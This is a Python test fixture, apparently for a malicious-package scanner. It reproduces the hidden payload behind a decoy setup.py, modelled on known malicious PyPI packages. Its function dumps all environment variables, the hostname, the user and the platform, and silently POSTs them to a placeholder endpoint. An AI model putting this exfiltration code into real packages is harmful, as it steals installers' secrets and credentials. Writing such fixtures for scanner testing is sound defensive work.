# INERT FIXTURE — never executed. Endpoint is REDACTED.example.
#
# The payload the decoy setup.py defers to, modeled on DeepSolid@99.6 /
# HLLM@912.6 (DataDog/malicious-software-packages-dataset). The scanner only
# ever sees this file if it follows `from main import m` out of the install
# command override — which is the whole point of the fixture.
#
# Whole-environment harvest welded to the identity read and the request that
# carries them: the same shape `exfil-setup-py/` pins, moved one import away.
import os
import platform
import socket
import getpass
import urllib.request
import json


def m():
    payload = json.dumps({
        "env": dict(os.environ),
        "host": socket.gethostname(),
        "user": getpass.getuser(),
        "plat": platform.platform(),
    })
    req = urllib.request.Request(
        "https://REDACTED.example/c",
        data=payload.encode(),
        method="POST",
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass
